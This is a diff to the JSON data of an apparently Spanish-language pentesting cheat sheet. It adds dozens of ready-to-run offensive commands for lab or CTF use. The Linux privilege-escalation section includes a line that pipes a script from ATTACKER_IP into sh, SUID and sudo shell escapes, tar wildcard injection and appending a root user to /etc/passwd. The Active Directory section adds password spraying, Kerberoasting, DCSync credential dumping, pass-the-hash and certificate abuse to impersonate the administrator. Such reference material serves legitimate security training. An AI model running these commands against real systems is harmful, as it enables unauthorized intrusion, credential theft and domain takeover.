@@ -1,8 +1,8 @@
 {
-  "generatedAt": "2026-07-06",
+  "generatedAt": "2026-07-07",
   "stats": {
     "totalSections": 19,
-    "totalCommands": 286,
+    "totalCommands": 378,
     "totalTags": 9
   },
   "tags": [
@@ -608,7 +608,45 @@
       "commands": [
         "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
         "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
-        "sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt"
+        "sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt",
+        "whatweb $URL",
+        "curl -sSI $URL",
+        "curl -sS $URL/robots.txt",
+        "nikto -h $URL",
+        "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 40",
+        "ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
+        "ffuf -u $URL -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
+        "nxc smb $IP",
+        "nxc smb $IP -u '' -p '' --shares",
+        "nxc smb $IP -u 'guest' -p '' --shares",
+        "smbclient -L //$IP -N",
+        "smbclient //$IP/share -N",
+        "smbmap -H $IP",
+        "enum4linux-ng -A $IP",
+        "nxc smb $IP -u 'guest' -p '' --rid-brute",
+        "rpcclient -U '' -N $IP",
+        "rpcclient -U '' -N $IP -c 'enumdomusers'",
+        "rpcclient -U '' -N $IP -c 'querydominfo'",
+        "nmblookup -A $IP",
+        "ftp $IP",
+        "nmap --script ftp-anon -p 21 $IP",
+        "wget -m --no-passive ftp://anonymous:anonymous@$IP",
+        "dig @$IP $DOMAIN",
+        "dig axfr @$IP $DOMAIN",
+        "dnsrecon -d $DOMAIN -n $IP",
+        "nslookup -type=any $DOMAIN $IP",
+        "snmpwalk -v2c -c public $IP",
+        "snmpbulkwalk -v2c -c public $IP",
+        "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP",
+        "showmount -e $IP",
+        "mkdir -p /mnt/nfs && sudo mount -t nfs $IP:/share /mnt/nfs -o nolock",
+        "ldapsearch -x -H ldap://$IP -s base namingContexts",
+        "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local'",
+        "nxc ldap $IP -u '' -p ''",
+        "mysql -h $IP -u root -p",
+        "impacket-mssqlclient $USER:$PASS@$IP -windows-auth",
+        "psql -h $IP -U postgres",
+        "redis-cli -h $IP"
       ],
       "tables": [
         [
@@ -663,6 +701,125 @@
         ],
         [
           "h2",
+          "HTTP / Web (80, 443, 8080)"
+        ],
+        [
+          "code",
+          [
+            "whatweb $URL",
+            "curl -sSI $URL",
+            "curl -sS $URL/robots.txt",
+            "nikto -h $URL",
+            "gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 40",
+            "ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
+            "ffuf -u $URL -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"
+          ]
+        ],
+        [
+          "h2",
+          "SMB (139, 445)"
+        ],
+        [
+          "code",
+          [
+            "nxc smb $IP",
+            "nxc smb $IP -u '' -p '' --shares",
+            "nxc smb $IP -u 'guest' -p '' --shares",
+            "smbclient -L //$IP -N",
+            "smbclient //$IP/share -N",
+            "smbmap -H $IP",
+            "enum4linux-ng -A $IP",
+            "nxc smb $IP -u 'guest' -p '' --rid-brute"
+          ]
+        ],
+        [
+          "h2",
+          "RPC / NetBIOS (135, 137)"
+        ],
+        [
+          "code",
+          [
+            "rpcclient -U '' -N $IP",
+            "rpcclient -U '' -N $IP -c 'enumdomusers'",
+            "rpcclient -U '' -N $IP -c 'querydominfo'",
+            "nmblookup -A $IP"
+          ]
+        ],
+        [
+          "h2",
+          "FTP (21)"
+        ],
+        [
+          "code",
+          [
+            "ftp $IP",
+            "nmap --script ftp-anon -p 21 $IP",
+            "wget -m --no-passive ftp://anonymous:anonymous@$IP"
+          ]
+        ],
+        [
+          "h2",
+          "DNS (53)"
+        ],
+        [
+          "code",
+          [
+            "dig @$IP $DOMAIN",
+            "dig axfr @$IP $DOMAIN",
+            "dnsrecon -d $DOMAIN -n $IP",
+            "nslookup -type=any $DOMAIN $IP"
+          ]
+        ],
+        [
+          "h2",
+          "SNMP (161/udp)"
+        ],
+        [
+          "code",
+          [
+            "snmpwalk -v2c -c public $IP",
+            "snmpbulkwalk -v2c -c public $IP",
+            "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP"
+          ]
+        ],
+        [
+          "h2",
+          "NFS (2049)"
+        ],
+        [
+          "code",
+          [
+            "showmount -e $IP",
+            "mkdir -p /mnt/nfs && sudo mount -t nfs $IP:/share /mnt/nfs -o nolock"
+          ]
+        ],
+        [
+          "h2",
+          "LDAP (389, 636)"
+        ],
+        [
+          "code",
+          [
+            "ldapsearch -x -H ldap://$IP -s base namingContexts",
+            "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local'",
+            "nxc ldap $IP -u '' -p ''"
+          ]
+        ],
+        [
+          "h2",
+          "Bases de datos (3306, 1433, 5432, 6379)"
+        ],
+        [
+          "code",
+          [
+            "mysql -h $IP -u root -p",
+            "impacket-mssqlclient $USER:$PASS@$IP -windows-auth",
+            "psql -h $IP -U postgres",
+            "redis-cli -h $IP"
+          ]
+        ],
+        [
+          "h2",
           "Servicios tipicos"
         ],
         [
@@ -703,7 +860,7 @@
           ]
         ]
       ],
-      "searchText": "Recon y servicios Encontrar superficie, nombres, versiones y rutas de entrada. Escaneo inicial nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt Usa -Pn si la maquina filtra ping. Primero descubre puertos; despues enumera versiones y scripts. UDP merece una pasada si sospechas DNS, SNMP, TFTP o NFS. Servicios tipicos Servicio Comandos utiles SMB smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares FTP ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/ DNS dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP SNMP snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP NFS showmount -e $IP; mount -t nfs $IP:/share /mnt/share SSH probar claves, usuarios filtrados y passphrases con ssh2john."
+      "searchText": "Recon y servicios Encontrar superficie, nombres, versiones y rutas de entrada. Escaneo inicial nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt Usa -Pn si la maquina filtra ping. Primero descubre puertos; despues enumera versiones y scripts. UDP merece una pasada si sospechas DNS, SNMP, TFTP o NFS. HTTP / Web (80, 443, 8080) whatweb $URL curl -sSI $URL curl -sS $URL/robots.txt nikto -h $URL gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 40 ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt ffuf -u $URL -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 SMB (139, 445) nxc smb $IP nxc smb $IP -u '' -p '' --shares nxc smb $IP -u 'guest' -p '' --shares smbclient -L //$IP -N smbclient //$IP/share -N smbmap -H $IP enum4linux-ng -A $IP nxc smb $IP -u 'guest' -p '' --rid-brute RPC / NetBIOS (135, 137) rpcclient -U '' -N $IP rpcclient -U '' -N $IP -c 'enumdomusers' rpcclient -U '' -N $IP -c 'querydominfo' nmblookup -A $IP FTP (21) ftp $IP nmap --script ftp-anon -p 21 $IP wget -m --no-passive ftp://anonymous:anonymous@$IP DNS (53) dig @$IP $DOMAIN dig axfr @$IP $DOMAIN dnsrecon -d $DOMAIN -n $IP nslookup -type=any $DOMAIN $IP SNMP (161/udp) snmpwalk -v2c -c public $IP snmpbulkwalk -v2c -c public $IP onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP NFS (2049) showmount -e $IP mkdir -p /mnt/nfs && sudo mount -t nfs $IP:/share /mnt/nfs -o nolock LDAP (389, 636) ldapsearch -x -H ldap://$IP -s base namingContexts ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' nxc ldap $IP -u '' -p '' Bases de datos (3306, 1433, 5432, 6379) mysql -h $IP -u root -p impacket-mssqlclient $USER:$PASS@$IP -windows-auth psql -h $IP -U postgres redis-cli -h $IP Servicios tipicos Servicio Comandos utiles SMB smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares FTP ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/ DNS dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP SNMP snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP NFS showmount -e $IP; mount -t nfs $IP:/share /mnt/share SSH probar claves, usuarios filtrados y passphrases con ssh2john."
     },
     {
       "id": "section-06",
@@ -1341,7 +1498,32 @@
         "getcap -r / 2>/dev/null",
         "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
         "cat /etc/crontab; ls -la /etc/cron.*",
-        "systemctl list-timers 2>/dev/null"
+        "systemctl list-timers 2>/dev/null",
+        "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
+        "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh",
+        "./pspy64",
+        "sudo -l",
+        "sudo find . -exec /bin/sh \\; -quit",
+        "sudo vim -c ':!/bin/sh'",
+        "sudo env /bin/sh",
+        "sudo LD_PRELOAD=/tmp/x.so <binario>",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "/usr/bin/find . -exec /bin/sh -p \\; -quit",
+        "cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
+        "getcap -r / 2>/dev/null",
+        "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+        "/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",
+        "cat /etc/crontab; ls -la /etc/cron.*",
+        "echo 'chmod +s /bin/bash' >> script_escribible.sh",
+        "touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh'",
+        "ls -la /etc/passwd /etc/shadow",
+        "openssl passwd -1 -salt hax pass123",
+        "echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t",
+        "cat /etc/exports",
+        "showmount -e $IP",
+        "sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash",
+        "uname -a; cat /etc/os-release",
+        "searchsploit linux kernel <version>"
       ],
       "tables": [
         [
@@ -1391,6 +1573,103 @@
           ]
         ],
         [
+          "h2",
+          "Automatizado"
+        ],
+        [
+          "code",
+          [
+            "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
+            "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh",
+            "./pspy64"
+          ]
+        ],
+        [
+          "h2",
+          "sudo / GTFOBins"
+        ],
+        [
+          "code",
+          [
+            "sudo -l",
+            "sudo find . -exec /bin/sh \\; -quit",
+            "sudo vim -c ':!/bin/sh'",
+            "sudo env /bin/sh",
+            "sudo LD_PRELOAD=/tmp/x.so <binario>"
+          ]
+        ],
+        [
+          "h2",
+          "SUID / SGID"
+        ],
+        [
+          "code",
+          [
+            "find / -perm -4000 -type f 2>/dev/null",
+            "/usr/bin/find . -exec /bin/sh -p \\; -quit",
+            "cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p"
+          ]
+        ],
+        [
+          "h2",
+          "Capabilities"
+        ],
+        [
+          "code",
+          [
+            "getcap -r / 2>/dev/null",
+            "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+            "/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"
+          ]
+        ],
+        [
+          "h2",
+          "Cron / tareas"
+        ],
+        [
+          "code",
+          [
+            "cat /etc/crontab; ls -la /etc/cron.*",
+            "echo 'chmod +s /bin/bash' >> script_escribible.sh",
+            "touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh'"
+          ]
+        ],
+        [
+          "h2",
+          "Ficheros escribibles"
+        ],
+        [
+          "code",
+          [
+            "ls -la /etc/passwd /etc/shadow",
+            "openssl passwd -1 -salt hax pass123",
+            "echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t"
+          ]
+        ],
+        [
+          "h2",
+          "NFS no_root_squash"
+        ],
+        [
+          "code",
+          [
+            "cat /etc/exports",
+            "showmount -e $IP",
+            "sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash"
+          ]
+        ],
+        [
+          "h2",
+          "Kernel / version"
+        ],
+        [
+          "code",
+          [
+            "uname -a; cat /etc/os-release",
+            "searchsploit linux kernel <version>"
+          ]
+        ],
+        [
           "table",
           [
             [
@@ -1428,7 +1707,7 @@
           ]
         ]
       ],
-      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd sudo -l find / -perm -4000 -type f -ls 2>/dev/null getcap -r / 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' cat /etc/crontab; ls -la /etc/cron.* systemctl list-timers 2>/dev/null Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
+      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd sudo -l find / -perm -4000 -type f -ls 2>/dev/null getcap -r / 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' cat /etc/crontab; ls -la /etc/cron.* systemctl list-timers 2>/dev/null Automatizado curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh ./pspy64 sudo / GTFOBins sudo -l sudo find . -exec /bin/sh \\; -quit sudo vim -c ':!/bin/sh' sudo env /bin/sh sudo LD_PRELOAD=/tmp/x.so <binario> SUID / SGID find / -perm -4000 -type f 2>/dev/null /usr/bin/find . -exec /bin/sh -p \\; -quit cp $(which bash) /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p Capabilities getcap -r / 2>/dev/null /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";' Cron / tareas cat /etc/crontab; ls -la /etc/cron.* echo 'chmod +s /bin/bash' >> script_escribible.sh touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh privesc.sh' Ficheros escribibles ls -la /etc/passwd /etc/shadow openssl passwd -1 -salt hax pass123 echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd && su r00t NFS no_root_squash cat /etc/exports showmount -e $IP sudo mount -o rw $IP:/share /mnt && cp $(which bash) /mnt/bash && chmod +s /mnt/bash Kernel / version uname -a; cat /etc/os-release searchsploit linux kernel <version> Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
     },
     {
       "id": "section-12",
@@ -1601,7 +1880,36 @@
         "nxc smb $IP",
         "smbclient -L //$IP -N",
         "nxc smb $IP -u 'Guest' -p '' --shares",
-        "nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt"
+        "nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt",
+        "nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt",
+        "impacket-lookupsid $DOMAIN/guest@$IP -no-pass",
+        "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName",
+        "kerbrute userenum -d $DOMAIN --dc $DC_FQDN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+        "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success",
+        "nxc smb $IP -u users.txt -p users.txt --no-bruteforce --continue-on-success",
+        "kerbrute passwordspray -d $DOMAIN --dc $DC_FQDN users.txt 'Password1!'",
+        "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
+        "impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP -outputfile asrep.hash",
+        "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
+        "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hash",
+        "nxc ldap $IP -u $USER -p $PASS --kerberoasting kerb.hash",
+        "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
+        "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
+        "nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All --dns-server $IP",
+        "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
+        "impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_FQDN",
+        "nxc smb $IP -u $USER -p $PASS --sam --lsa --ntds",
+        "nxc smb $IP -u $USER -H <NTLM>",
+        "impacket-psexec $DOMAIN/$USER@$IP -hashes :<NTLM>",
+        "impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $IP",
+        "export KRB5CCNAME=$USER.ccache; impacket-psexec -k -no-pass $DOMAIN/$USER@$DC_FQDN",
+        "evil-winrm -i $IP -u $USER -p $PASS",
+        "evil-winrm -i $IP -u $USER -H <NTLM>",
+        "impacket-wmiexec $DOMAIN/$USER:$PASS@$IP",
+        "impacket-smbexec $DOMAIN/$USER:$PASS@$IP",
+        "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $IP -vulnerable -stdout",
+        "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $IP -ca <CA> -template <TEMPLATE> -upn administrator@$DOMAIN",
+        "certipy auth -pfx administrator.pfx -dc-ip $IP"
       ],
       "tables": [
         [
@@ -1657,6 +1965,116 @@
           ]
         ],
         [
+          "h2",
+          "Usuarios del dominio"
+        ],
+        [
+          "code",
+          [
+            "nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt",
+            "impacket-lookupsid $DOMAIN/guest@$IP -no-pass",
+            "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName",
+            "kerbrute userenum -d $DOMAIN --dc $DC_FQDN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
+          ]
+        ],
+        [
+          "h2",
+          "Password spraying"
+        ],
+        [
+          "code",
+          [
+            "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success",
+            "nxc smb $IP -u users.txt -p users.txt --no-bruteforce --continue-on-success",
+            "kerbrute passwordspray -d $DOMAIN --dc $DC_FQDN users.txt 'Password1!'"
+          ]
+        ],
+        [
+          "h2",
+          "AS-REP Roasting (sin preauth)"
+        ],
+        [
+          "code",
+          [
+            "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
+            "impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP -outputfile asrep.hash",
+            "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"
+          ]
+        ],
+        [
+          "h2",
+          "Kerberoasting (cuentas con SPN)"
+        ],
+        [
+          "code",
+          [
+            "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hash",
+            "nxc ldap $IP -u $USER -p $PASS --kerberoasting kerb.hash",
+            "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"
+          ]
+        ],
+        [
+          "h2",
+          "BloodHound"
+        ],
+        [
+          "code",
+          [
+            "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
+            "nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All --dns-server $IP"
+          ]
+        ],
+        [
+          "h2",
+          "Dump de credenciales / DCSync"
+        ],
+        [
+          "code",
+          [
+            "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
+            "impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_FQDN",
+            "nxc smb $IP -u $USER -p $PASS --sam --lsa --ntds"
+          ]
+        ],
+        [
+          "h2",
+          "Pass-the-Hash y tickets"
+        ],
+        [
+          "code",
+          [
+            "nxc smb $IP -u $USER -H <NTLM>",
+            "impacket-psexec $DOMAIN/$USER@$IP -hashes :<NTLM>",
+            "impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $IP",
+            "export KRB5CCNAME=$USER.ccache; impacket-psexec -k -no-pass $DOMAIN/$USER@$DC_FQDN"
+          ]
+        ],
+        [
+          "h2",
+          "Acceso y shell"
+        ],
+        [
+          "code",
+          [
+            "evil-winrm -i $IP -u $USER -p $PASS",
+            "evil-winrm -i $IP -u $USER -H <NTLM>",
+            "impacket-wmiexec $DOMAIN/$USER:$PASS@$IP",
+            "impacket-smbexec $DOMAIN/$USER:$PASS@$IP"
+          ]
+        ],
+        [
+          "h2",
+          "ADCS (certipy)"
+        ],
+        [
+          "code",
+          [
+            "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $IP -vulnerable -stdout",
+            "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $IP -ca <CA> -template <TEMPLATE> -upn administrator@$DOMAIN",
+            "certipy auth -pfx administrator.pfx -dc-ip $IP"
+          ]
+        ],
+        [
           "table",
           [
             [
@@ -1698,7 +2116,7 @@
           ]
         ]
       ],
-      "searchText": "Active Directory Workflow de dominio: usuarios, credenciales, Kerberos, BloodHound y movimiento. En AD el enfoque cambia: no es solo explotar una maquina, sino transformar identidad y permisos en movimiento. export DOMAIN=dominio.local export DC_HOST=DC01 export DC_FQDN=dc01.dominio.local echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP nxc smb $IP smbclient -L //$IP -N nxc smb $IP -u 'Guest' -p '' --shares nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt Fase Objetivo Identificar dominio DC, FQDN, realm, clock skew y /etc/hosts correcto. Usuarios reales RID brute, LDAP, shares, naming patterns. Credenciales Spraying controlado, usuario=password, leaks en shares. Reenumerar Cada credencial nueva cambia shares, LDAP, WinRM y permisos. Kerberos AS-REP roasting, Kerberoasting, tickets, errores de hora. BloodHound Rutas de ACL, sesiones, grupos, GenericAll/WriteDacl/ForceChangePassword. Acceso WinRM, SMB exec, RDP o movimiento lateral segun permisos."
+      "searchText": "Active Directory Workflow de dominio: usuarios, credenciales, Kerberos, BloodHound y movimiento. En AD el enfoque cambia: no es solo explotar una maquina, sino transformar identidad y permisos en movimiento. export DOMAIN=dominio.local export DC_HOST=DC01 export DC_FQDN=dc01.dominio.local echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP nxc smb $IP smbclient -L //$IP -N nxc smb $IP -u 'Guest' -p '' --shares nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt Usuarios del dominio nxc smb $IP -u 'guest' -p '' --rid-brute | tee rid.txt impacket-lookupsid $DOMAIN/guest@$IP -no-pass ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName kerbrute userenum -d $DOMAIN --dc $DC_FQDN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt Password spraying nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success nxc smb $IP -u users.txt -p users.txt --no-bruteforce --continue-on-success kerbrute passwordspray -d $DOMAIN --dc $DC_FQDN users.txt 'Password1!' AS-REP Roasting (sin preauth) impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP -outputfile asrep.hash hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt Kerberoasting (cuentas con SPN) impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hash nxc ldap $IP -u $USER -p $PASS --kerberoasting kerb.hash hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt BloodHound bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All --dns-server $IP Dump de credenciales / DCSync impacket-secretsdump $DOMAIN/$USER:$PASS@$IP impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_FQDN nxc smb $IP -u $USER -p $PASS --sam --lsa --ntds Pass-the-Hash y tickets nxc smb $IP -u $USER -H <NTLM> impacket-psexec $DOMAIN/$USER@$IP -hashes :<NTLM> impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $IP export KRB5CCNAME=$USER.ccache; impacket-psexec -k -no-pass $DOMAIN/$USER@$DC_FQDN Acceso y shell evil-winrm -i $IP -u $USER -p $PASS evil-winrm -i $IP -u $USER -H <NTLM> impacket-wmiexec $DOMAIN/$USER:$PASS@$IP impacket-smbexec $DOMAIN/$USER:$PASS@$IP ADCS (certipy) certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $IP -vulnerable -stdout certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $IP -ca <CA> -template <TEMPLATE> -upn administrator@$DOMAIN certipy auth -pfx administrator.pfx -dc-ip $IP Fase Objetivo Identificar dominio DC, FQDN, realm, clock skew y /etc/hosts correcto. Usuarios reales RID brute, LDAP, shares, naming patterns. Credenciales Spraying controlado, usuario=password, leaks en shares. Reenumerar Cada credencial nueva cambia shares, LDAP, WinRM y permisos. Kerberos AS-REP roasting, Kerberoasting, tickets, errores de hora. BloodHound Rutas de ACL, sesiones, grupos, GenericAll/WriteDacl/ForceChangePassword. Acceso WinRM, SMB exec, RDP o movimiento lateral segun permisos."
     },
     {
       "id": "section-14",
